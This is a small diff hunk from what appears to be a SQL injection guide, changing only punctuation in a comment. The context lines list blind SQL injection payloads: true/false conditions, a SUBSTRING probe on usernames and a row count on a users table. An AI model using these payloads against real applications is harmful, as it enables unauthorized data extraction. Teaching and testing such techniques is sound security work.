@@ -72,7 +72,7 @@ Or:
 
 ```sql
 ' AND 1=1--   (true)
-' AND 1=2--   (false — different response = injectable)
+' AND 1=2--   (false: different response = injectable)
 
 ' AND SUBSTRING(username,1,1)='a'--
 ' AND (SELECT COUNT(*) FROM users)>0--
